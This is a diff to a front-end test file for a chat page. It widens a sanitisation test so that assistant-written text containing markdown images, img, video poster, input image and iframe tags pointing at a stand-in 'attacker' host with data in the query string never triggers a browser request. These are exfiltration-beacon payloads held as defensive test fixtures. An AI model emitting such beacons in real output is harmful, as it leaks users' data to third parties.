@@ -517,17 +517,23 @@ it('sanitises the answer: a script tag in the model text never becomes a script 
   expect(document.querySelector('script')).toBeNull();
 });
 
-it('renders no image from an answer: an <img> in the model text would be a GET nobody clicked', async () => {
-  // No CSP in this repo, so a remote image URL the model wrote would be fetched on render — an
-  // exfiltration beacon whose query string the model chooses.
+it('fetches nothing from an answer: no element in the model text can make the browser issue a GET', async () => {
+  // No CSP in this repo, so any remote URL the model wrote would be fetched on render — an
+  // exfiltration beacon whose query string the model chooses. `img` was only the obvious one.
   chatMock.mockResolvedValue({
     conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
-    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">' })],
+    messages: [
+      msg({
+        id: 'm2',
+        role: 'assistant',
+        text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">\n\n<video poster="https://attacker/?d=poster"></video>\n\n<input type="image" src="https://attacker/?d=input">\n\n<iframe src="https://attacker/?d=frame"></iframe>',
+      }),
+    ],
   });
   render(<ChatPage />);
 
   await screen.findByText(/olha isso/);
-  expect(document.querySelectorAll('img')).toHaveLength(0);
+  expect(document.querySelectorAll('img, video, input, iframe, svg, image')).toHaveLength(0);
 });
 
 it('puts a card between the two messages it was proposed between', async () => {
